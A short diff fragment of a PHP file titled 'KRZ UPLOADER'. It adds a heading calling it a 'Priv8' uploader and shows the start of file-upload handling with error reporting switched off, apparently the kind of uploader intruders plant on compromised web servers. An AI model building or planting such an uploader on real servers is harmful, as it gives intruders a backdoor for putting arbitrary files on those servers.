@@ -1,4 +1,7 @@
 <title>KRZ UPLOADER</title>
+<h2>Mohammed Kairz Priv8 uploaders<h2>
+  <center>
+    <br>
 <?php
 error_reporting(0);
 $saw1 = $_FILES['f']['tmp_name'];
